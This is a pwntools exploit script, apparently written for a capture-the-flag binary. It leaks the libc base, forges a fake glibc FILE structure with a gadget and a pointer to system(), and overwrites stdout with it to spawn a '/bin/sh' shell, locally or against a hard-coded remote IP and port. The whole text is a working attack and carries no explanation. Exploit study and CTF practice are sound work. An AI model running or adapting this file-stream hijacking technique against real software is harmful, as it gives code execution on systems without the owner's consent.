#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
#context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=-1', '--geometry=128x98+2900+0', '-e']
context.terminal = ['alacritty', '--title=GDB-Pwn','-o', 'window.dimensions.lines=76', '-o', 'window.dimensions.columns=150', '-o', 'window.position.x=2800', '-o', 'window.position.y=0','-o','font.size=8.0','-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./prog')
libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "206.189.113.236", "30674"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef.bata24.git/gef.py
    gef config context.show_opcodes_size 9
    si
    directory /usr/src/glibc/glibc-2.38
    b main
    c
    b *__GI__IO_wfile_underflow
    c
     ''')
  else:
    if args.COV:
      p = process('qltool run --no-console --rootfs rootfs/ -v disasm --log-file coverage.log --no-console -f '+exe.path, shell=True)
    else:
      p = process(exe.path)


def write(addr, data):
  sla('choice> ', '1')
  sla('> ', str(addr))
  sla('size> ', str(len(data))+'\x00')
  sa('data> ', data)

libc.address = int(rcu('leak: ','\n'),16)-libc.sym['_IO_2_1_stdout_']
logbase()

# some constants
stdout_lock = libc.address + 0x2008f0	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001676a0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']		# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
# write the fake Filestructure to stdout
write(libc.sym['_IO_2_1_stdout_'], bytes(fake))
# enjoy your shell

p.interactive()

